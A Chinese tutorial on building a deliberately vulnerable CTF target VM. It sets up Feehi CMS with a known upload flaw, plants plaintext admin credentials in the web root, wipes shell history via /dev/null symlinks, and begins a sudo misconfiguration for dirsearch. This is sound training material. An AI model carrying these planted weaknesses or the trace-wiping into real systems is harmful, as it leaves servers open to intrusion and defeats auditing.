src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABH1JREFUSA3tVl1oHFUUPmdmd2ltklqbpJDiNnXFmgbFktho7YMPNiJSSZM0+CAYSkUELVhM6YuwIPpgoOKDqOBDC0XE2CQoNtQXBUFTTcCi+Wlh1V2TQExsUzcltd3M9Tt3ZjZzZ2fT+OJTL8yeM+eee757fmeJbq//KQL8X3DUSFOcfr7cRsRtxNQMWueeVzOkaITIGqQHNg5y8+jNW9ldM7A6nTpAjuolUikAwq7CE3WcM2RRDz+XGVgN3FptU/aUSlvq9Pa3iZ1+sgAqJyyAFqkipd9dqiwHF3P65YycLWc/6sqGrvoEoIp6DOFaX5h6+dnfjkWprwqsPk0dUGq5vySwDImC10KxFHgGL1SWoc92O3eVht09qdXNH11I2SsTsJYqMWzihqGMi+A+Garf3BAuuLI5oGlULyNfyB/HYNujwktOfRrMr5t77NmevqaUopx0grnKAyvVpmwUDB4x6FPXuGvYLTDwWsejwgtgkYKPqRJg8SV6xaiZ3ZTppGneS4yfH5/66fZSDHv+QZci/+h5c5UHtpy67JUqGppM0sh0Nc1dW6/N1W5Yoqat8/TU/VnadmdeW2PLLSyh0cvxBs3KbqTmwYPpxN4do/mzE8nEpvX/UMu2Wbp74zUAK5q6WkHns7V0eWkdPbPzd3rxkTGybadYySumVzhcaJFbs5UrEkQ/+CK8gF5dnh/6ciIZ73gwQ927L1IitoxKLXYP3SjYdOrHHfTZhRRlFyrorafPk20B3HPD1y2G3qKZME5Jcf3t/HUC13/8tSd++vqFveMUTwAUxSUFI1QekR1+bIze3D9MF2aq6cPvG72CgnldWCFqyRw3lwH8ZMerjTD9ElRO7Gv44wNpC90aASqGfVlz/Rx17srQ57/UU26hkhQqUB7dBR71WmzQhHUnblGmVOEw0jhbV1n9OlXUDCIRGaNV5Jp43N516fN7JmnTHdfp7Hgy0luO4aMhtkLL8Bi3bUWYvzh5Mn1dTxrL6QmGuRhGL/TiTTxRoEdTszSaq9GR0NGA3KdkOz3hqSV3MIDhQ5IVX/Ivx3umBti2es2h4eZby7x8br1rkf7Mo90AqC8aQ3sJeNzqFRu+vSANAQe3PL7l0HGOAdwDCeZYvNKeoZp1Qfs6Aipndh86HmFRi0LAnEO47wsqM6cdfjh3jBPUzhZy7nvlUfFsamED1VQt6aISHVymXZ/B2aCtIG8AI8xfobj2d3en1wWVhOeHELKmLQ1s211s88comkv4UCwWyF787mJdYXtNfhKAXVqnKTq8QZvGAGGOfaTo5pGZ/PwbUCr5+DPr/1J92JNHr9aOl/F3iI5+O1nfybsGxoimvZ3ViWSluDITw3P37mypheDIPY0tw7+O/5ApbkYw+zpfaUVu32Pi98+defdUhEpZkRFq0aqyNh9FuL9hpYbEm6iwi0z2REd09ZmyENEbuhjDWzKvZXTqKYaBIr3tt5kuPtQBZFvEUwHt60vfCNu41XsksH9Ij1BMMz1Y0OOunHNShFIP5868g5zeXmuLwL9T4b6Q2+KejgAAAABJRU5ErkJggg==">MazeSec 矛计划 - 如何制作一台靶机<!----></h1>  <div class="theme-vdoing-content content__default"><blockquote><p>Search 靶机构建流程示例</p></blockquote> <p>一份出题模板参考，实际出题时可根据需求灵活调整。</p> <h2 id="_1、构建工具"><a href="#_1、构建工具" class="header-anchor">#</a> 1、构建工具</h2> <ul><li>VirtualBox</li> <li>模板ova文件</li> <li>Tabby（ssh客户端）</li></ul> <p>VBox优势：跨平台、免费、开源、导出分发ova文件方便、兼容性好</p> <h2 id="_2、导入靶机"><a href="#_2、导入靶机" class="header-anchor">#</a> 2、导入靶机</h2> <p>找群里有出题经验的群友求助一份模板 ova，导入模板 ova 文件</p> <p><img src="/medias/maze-mao/3.png" alt=""></p> <p>导入后，可能需要调整到物理网卡桥接模式，校园网的话，可能限制设备数量，可以选择仅主机模式。</p> <p><img src="/medias/maze-mao/4.png" alt=""></p> <p><img src="/medias/maze-mao/5.png" alt=""></p> <h2 id="_3、ssh登录靶机"><a href="#_3、ssh登录靶机" class="header-anchor">#</a> 3、SSH登录靶机</h2> <p>我这个版本的模板 ova，默认用户名密码是 root/todd、welcome/todd，使用 Tabby SSH 登录到 root 用户</p> <h3 id="移除默认welcome用户"><a href="#移除默认welcome用户" class="header-anchor">#</a> 移除默认welcome用户</h3> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>deluser --remove-home welcome
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="添加普通用户-7r1umphk"><a href="#添加普通用户-7r1umphk" class="header-anchor">#</a> 添加普通用户 7r1umphk</h3> <blockquote><p>-m 表示创建用户的同时创建用户主目录， -s 指定用户登录后使用的 shell，-d 指定用户主目录位置</p></blockquote> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">useradd</span> <span class="token parameter variable">-m</span> <span class="token parameter variable">-s</span> /bin/bash <span class="token parameter variable">-d</span> /home/7r1umphk 7r1umphk
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="生成密码"><a href="#生成密码" class="header-anchor">#</a> 生成密码</h3> <blockquote><p>生成一个18字节的随机字符串，经过 base64 编码后长度为24字符，可以作为一个强密码使用</p></blockquote> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>openssl rand <span class="token parameter variable">-base64</span> <span class="token number">18</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="设置密码"><a href="#设置密码" class="header-anchor">#</a> 设置密码</h3> <blockquote><p>chpasswd 命令可以通过管道输入的方式批量修改用户密码，格式为 用户名:密码</p></blockquote> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token builtin class-name">echo</span> <span class="token string">&quot;root:mxmrtLHzuBk4vDpfFghRkDZI&quot;</span> <span class="token operator">|</span> chpasswd
<span class="token builtin class-name">echo</span> <span class="token string">&quot;7r1umphk:P3JkplQF5G255aUJWBRKEmzp&quot;</span> <span class="token operator">|</span> chpasswd
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><img src="/medias/maze-mao/6.png" alt=""></p> <h3 id="清理历史命令"><a href="#清理历史命令" class="header-anchor">#</a> 清理历史命令</h3> <p>擦除痕迹，避免 .bash_history 文件里遗漏历史命令，仅用于实验靶机，生产环境请勿这样做</p> <blockquote><p>实际上内存中的 shell 历史、journal、其他服务日志、命令行参数等仍然会存在日志记录。</p></blockquote> <p>root 用户</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">rm</span> /root/.bash_history
<span class="token function">rm</span> /root/.viminfo
<span class="token function">ln</span> <span class="token parameter variable">-sf</span> /dev/null /root/.bash_history
<span class="token function">ln</span> <span class="token parameter variable">-sf</span> /dev/null /root/.viminfo
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>普通用户 7r1umphk</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">rm</span> /home/7r1umphk/.bash_history
<span class="token function">rm</span> /home/7r1umphk/.viminfo
<span class="token function">ln</span> <span class="token parameter variable">-sf</span> /dev/null /home/7r1umphk/.bash_history
<span class="token function">ln</span> <span class="token parameter variable">-sf</span> /dev/null /home/7r1umphk/.viminfo
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h3 id="修改主机名"><a href="#修改主机名" class="header-anchor">#</a> 修改主机名</h3> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>hostnamectl set-hostname Search
<span class="token builtin class-name">echo</span> <span class="token string">'127.0.0.1 Search'</span> <span class="token operator">&gt;&gt;</span> /etc/hosts
<span class="token function">su</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p><img src="/medias/maze-mao/7.png" alt=""></p> <h2 id="_4、部署-web-环境"><a href="#_4、部署-web-环境" class="header-anchor">#</a> 4、部署 Web 环境</h2> <h3 id="基础环境检查"><a href="#基础环境检查" class="header-anchor">#</a> 基础环境检查</h3> <p>模板是已经配置好了 apache 以 www-data 用户在 80 端口运行的 PHP+apache web 环境。</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment"># 查看 apache 的运行用户</span>
root@Search:~<span class="token comment"># grep -v '^#' /etc/apache2/apache2.conf </span>
User www-data
Group www-data
<span class="token comment"># 查看 apache 的 web 根目录</span>
root@Search:~<span class="token comment"># grep -v '^#' /etc/apache2/sites-enabled/000-default.conf</span>
DocumentRoot /var/www/html
<span class="token comment"># 查看 apache 启用的 php 版本</span>
root@Search:~<span class="token comment"># ls /etc/apache2/mods-enabled/ | grep php</span>
php8.3.conf
php8.3.load
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><h3 id="php-配置检查"><a href="#php-配置检查" class="header-anchor">#</a> php 配置检查</h3> <p>在 /var/www/html/ 下创建一个 index.php 文件，内容如下：</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token builtin class-name">cd</span> /var/www/html
<span class="token function">rm</span> index.html
<span class="token builtin class-name">echo</span> <span class="token string">'&lt;?=phpinfo();?&gt;'</span> <span class="token operator">&gt;</span> /var/www/html/index.php
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>从 phpinfo 信息里找到 php.ini 配置文件路径，确认配置文件位置正确，且配置符合预期。</p> <p><img src="/medias/maze-mao/8.png" alt=""></p> <p>模板默认禁用了一些函数，根据你的需求灵活调整，php配置文件通过上面可以知道在 <code>/etc/php/8.3/apache2/php.ini</code>，可以在配置文件里修改禁用函数。</p> <p><img src="/medias/maze-mao/9.png" alt=""></p> <p>调试完，删除 index.php 文件</p> <h3 id="部署-feehi-cms"><a href="#部署-feehi-cms" class="header-anchor">#</a> 部署 Feehi CMS</h3> <p>Feehi CMS地址：<a href="https://github.com/liufee/cms" target="_blank" rel="noopener noreferrer">https://github.com/liufee/cms<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a>
文件上传getshell issue地址：<a href="https://github.com/liufee/cms/issues/70" target="_blank" rel="noopener noreferrer">https://github.com/liufee/cms/issues/70<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>根据项目的 README 说明，部署 Feehi CMS</p> <p><img src="/medias/maze-mao/10.png" alt=""></p> <p>使用 wget 下载源码到本地，没有wget，使用busybox自带的 wget 命令，下载完成后解压到 /var/www/html 目录下</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>root@Search:/var/www/html<span class="token comment"># busybox wget http://resource-1251086492.cossh.myqcloud.com/Feehi_CMS.zip</span>
Connecting to resource-1251086492.cossh.myqcloud.com <span class="token punctuation">(</span><span class="token number">36.155</span>.210.171:80<span class="token punctuation">)</span>
Feehi_CMS.zip        <span class="token number">100</span>% <span class="token operator">|</span>***********************************************************************************************************<span class="token operator">|</span> <span class="token number">38</span>.3M  <span class="token number">0</span>:00:00 ETA
root@Search:/var/www/html<span class="token comment"># ls</span>
Feehi_CMS.zip
root@Search:/var/www/html<span class="token comment"># unzip Feehi_CMS.zip -d /var/www/html/</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p><img src="/medias/maze-mao/11.png" alt=""></p> <p>然后在第二个配置文档说明，配置一下 apache web根目录<a href="https://github.com/liufee/cms/blob/master/docs/WEBSERVER_CONFIG.md" target="_blank" rel="noopener noreferrer">https://github.com/liufee/cms/blob/master/docs/WEBSERVER_CONFIG.md<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p><img src="/medias/maze-mao/12.png" alt=""></p> <p>修改 /etc/apache2/sites-available/000-default.conf 文件，把 apache 配置部分写进去 <a href="https://github.com/liufee/cms/blob/master/docs/WEBSERVER_CONFIG.md" target="_blank" rel="noopener noreferrer">https://github.com/liufee/cms/blob/master/docs/WEBSERVER_CONFIG.md<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">vim</span> /etc/apache2/sites-available/000-default.conf
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/maze-mao/13.png" alt=""></p> <p>重启 apache 服务</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>systemctl restart apache2
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>把 /var/www/html/ 目录权限改为 www-data 用户和用户组</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">chown</span> <span class="token parameter variable">-R</span> www-data:www-data /var/www/html/
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>在这个 CMS 推荐的 apache 配置文件里，有关于 RewriteEngine 的 VirtualHost 配置，需要启用一下 rewrite 模块</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>root@Search:/var/www/html<span class="token comment"># # 启用rewrite模块</span>
root@Search:/var/www/html<span class="token comment"># sudo a2enmod rewrite</span>
Enabling module rewrite.
To activate the new configuration, you need to run:
  systemctl restart apache2
root@Search:/var/www/html<span class="token comment"># </span>
root@Search:/var/www/html<span class="token comment"># # 检查模块是否启用</span>
root@Search:/var/www/html<span class="token comment"># sudo apache2ctl -M | grep rewrite</span>
AH00558: apache2: Could not reliably determine the server<span class="token string">'s fully qualified domain name, using 127.0.0.1. Set the '</span>ServerName' directive globally to suppress this message
 rewrite_module <span class="token punctuation">(</span>shared<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><p>同时修改 apache 主配置文件，允许 CMS 的 .htaccess 文件生效</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">vim</span> /etc/apache2/apache2.conf
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/maze-mao/14.png" alt=""></p> <p>配置一个 ServerName，随便配置一个，就叫 search.todd 吧，再检查语法</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token builtin class-name">echo</span> <span class="token string">'127.0.0.1 search.todd'</span> <span class="token operator">&gt;&gt;</span> /etc/hosts
<span class="token builtin class-name">echo</span> <span class="token string">'ServerName search.todd'</span> <span class="token operator">&gt;&gt;</span> /etc/apache2/apache2.conf
apache2ctl configtest
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p><img src="/medias/maze-mao/17.png" alt=""></p> <h3 id="安装-mysql-数据库"><a href="#安装-mysql-数据库" class="header-anchor">#</a> 安装 mysql 数据库</h3> <p>由于当前模板使用的是已结束生命周期的 Debian 10，且源已被移至归档仓库，所以使用 apt 安装 mysql/mariadb 的成本较高。为简化出题流程，这里直接使用官方 MySQL 5.7 的二进制包手动部署。</p> <p>我选择官网下载二进制安装包<a href="https://downloads.mysql.com/archives/community/" target="_blank" rel="noopener noreferrer">https://downloads.mysql.com/archives/community/<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p><img src="/medias/maze-mao/19.png" alt=""></p> <p>去阿里云镜像下载速度更快 <a href="https://mirrors.aliyun.com/mysql/MySQL-5.7/mysql-5.7.38-linux-glibc2.12-x86_64.tar.gz" target="_blank" rel="noopener noreferrer">https://mirrors.aliyun.com/mysql/MySQL-5.7/mysql-5.7.38-linux-glibc2.12-x86_64.tar.gz<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p><img src="/medias/maze-mao/20.png" alt=""></p> <p>下载 mysql 二进制包，这些东西建议 windows 本地下载完成上传到靶机</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token builtin class-name">cd</span> /tmp
busybox <span class="token function">wget</span> https://mirrors.aliyun.com/mysql/MySQL-5.7/mysql-5.7.38-linux-glibc2.12-x86_64.tar.gz
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>解压到 /usr/local/ 目录</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment"># 1. 解压到 /usr/local</span>
<span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> mysql-5.7.38-linux-glibc2.12-x86_64.tar.gz <span class="token parameter variable">-C</span> /usr/local/
<span class="token builtin class-name">cd</span> /usr/local
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>创建软链接</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">ln</span> <span class="token parameter variable">-s</span> mysql-5.7.38-linux-glibc2.12-x86_64 mysql
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>创建mysql用户和组</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">groupadd</span> mysql
<span class="token function">useradd</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-g</span> mysql <span class="token parameter variable">-s</span> /bin/false mysql <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>设置权限</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">chown</span> <span class="token parameter variable">-R</span> mysql:mysql /usr/local/mysql
<span class="token function">chmod</span> <span class="token parameter variable">-R</span> <span class="token number">755</span> /usr/local/mysql
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p><img src="/medias/maze-mao/23.png" alt=""></p> <p>初始化mysql</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment"># 1. 创建数据目录</span>
<span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /var/lib/mysql
<span class="token function">chown</span> mysql:mysql /var/lib/mysql

<span class="token comment"># 2. 初始化数据库（关键步骤！）</span>
<span class="token builtin class-name">cd</span> /usr/local/mysql
bin/mysqld <span class="token parameter variable">--initialize</span> <span class="token parameter variable">--user</span><span class="token operator">=</span>mysql <span class="token parameter variable">--basedir</span><span class="token operator">=</span>/usr/local/mysql <span class="token parameter variable">--datadir</span><span class="token operator">=</span>/var/lib/mysql <span class="token parameter variable">--explicit_defaults_for_timestamp</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br></div></div><p>记住 mysql root密码 uXEugaqla2%d</p> <p><img src="/medias/maze-mao/24.png" alt=""></p> <p>创建Systemd服务</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment"># 1. 创建配置文件</span>
<span class="token function">sudo</span> <span class="token function">tee</span> /etc/my.cnf <span class="token operator">&lt;&lt;</span> <span class="token string">'EOF'
[mysqld]
basedir=/usr/local/mysql
datadir=/var/lib/mysql
socket=/run/mysqld/mysqld.sock
bind-address = 127.0.0.1
port=3306
user=mysql
max_connections=151
character-set-server=utf8mb4
collation-server=utf8mb4_unicode_ci
default-storage-engine=INNODB

[client]
socket=/run/mysqld/mysqld.sock
EOF</span>

<span class="token comment"># 2. 创建systemd服务文件</span>
<span class="token function">sudo</span> <span class="token function">tee</span> /etc/systemd/system/mysql.service <span class="token operator">&lt;&lt;</span> <span class="token string">'EOF'
[Unit]
Description=MySQL Server
After=network.target

[Service]
Type=simple
User=mysql
Group=mysql
RuntimeDirectory=mysqld
RuntimeDirectoryMode=0755
ExecStart=/usr/local/mysql/bin/mysqld --defaults-file=/etc/my.cnf
Restart=on-failure
RestartSec=5
TimeoutStartSec=300

[Install]
WantedBy=multi-user.target
EOF</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br></div></div><p>启动MySQL</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>systemctl daemon-reload
systemctl <span class="token builtin class-name">enable</span> mysql
systemctl start mysql
systemctl status mysql
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>（正常在线环境下，使用受支持版本的 Debian，直接 apt install mariadb-server 即可，这里只是因为模板系统过旧。）</p> <p><img src="/medias/maze-mao/26.png" alt=""></p> <p>创建全局符号链接</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/local/mysql/bin/mysql /usr/local/bin/mysql
<span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/local/mysql/bin/mysqladmin /usr/local/bin/mysqladmin
<span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/local/mysql/bin/mysqldump /usr/local/bin/mysqldump
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>验证是否可用</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>mysql <span class="token parameter variable">-uroot</span> -puXEugaqla2%d
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><img src="/medias/maze-mao/27.png" alt=""></p> <p>修改mysql root 密码</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>mysqladmin <span class="token parameter variable">-u</span> root -p<span class="token string">'uXEugaqla2%d'</span> password <span class="token string">'6td36JaXdvyq7PJ8nklIzvqi'</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h3 id="配置-cms"><a href="#配置-cms" class="header-anchor">#</a> 配置 CMS</h3> <p>访问 http://靶机IP/install.php 进行 cms 安装配置</p> <p><img src="/medias/maze-mao/28.png" alt=""></p> <p>随便想一个admin用户密码，例如：MazeSec2025</p> <p>随便想一个邮箱，admin@maze-sec.com</p> <p><img src="/medias/maze-mao/29.png" alt=""></p> <p><img src="/medias/maze-mao/30.png" alt=""></p> <p>在 CMS 根目录放一个 admin 用户的 备份凭证文件，确保是一个常见扫描工具的文件名并且 www-data 可读</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>root@Search:~<span class="token comment"># echo 'admin:MazeSec2025' &gt; /var/www/html/frontend/web/setup.txt</span>
root@Search:~<span class="token comment"># ls -alh /var/www/html/frontend/web/setup.txt </span>
-rw-r--r-- <span class="token number">1</span> root root <span class="token number">18</span> Dec  <span class="token number">6</span> <span class="token number">12</span>:56 /var/www/html/frontend/web/setup.txt
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><p>www-data 用户的入口算是完成了</p> <p><img src="/medias/maze-mao/55.png" alt=""></p> <h2 id="_5、pip-安装-dirsearch"><a href="#_5、pip-安装-dirsearch" class="header-anchor">#</a> 5、pip 安装 dirsearch</h2> <p>dirsearch Github 仓库<a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener noreferrer">https://github.com/maurosoria/dirsearch<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p> <p>重点关注 python 版本要求 3.9 以上，可选择 pip 安装，靶机 python 3.9.2，符合条件</p> <p><img src="/medias/maze-mao/31.png" alt=""></p> <p><img src="/medias/maze-mao/32.png" alt=""></p> <h2 id="_6、sudo-权限-dirsearch-配置"><a href="#_6、sudo-权限-dirsearch-配置" class="header-anchor">#</a> 6、sudo 权限 dirsearch 配置</h2> <p>查看 dirsearch 绝对路径 /usr/local/bin/dirsearch</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>root@Search:/var/www/html<span class="token comment"># which dirsearch</span>
/usr/local/bin/dirsearch
root@Search:/var/www/html<span class="token comment"># ls -alh /usr/local/bin/dirsearch </span>
-rwxr-xr-x <span class="token number">1</span> root root <span class="token number">218</span> Dec  <span class="token number">6</span> <span class="token number">10</span>:58 /usr/local/bin/dirsearch
root@Search:/var/www/html<span class="token comment"># </span>
